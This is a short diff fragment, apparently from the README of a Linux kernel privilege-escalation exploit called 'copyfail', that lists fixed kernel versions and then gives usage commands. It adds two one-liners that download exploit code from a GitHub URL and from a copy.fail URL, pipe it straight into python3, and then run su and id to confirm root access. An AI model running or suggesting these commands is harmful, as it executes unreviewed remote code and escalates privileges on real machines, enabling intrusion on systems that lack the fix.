@@ -13,9 +13,13 @@ Fixed in Kernel versions:
 5.10.254
 
 This repo:
+
+
 curl https://github.com/chrono1313/copyfail/blob/main/copyfail.py | python3 && su
+
 id
 
 ALT:
+
 curl https://copy.fail/exp | python3 && su
 id
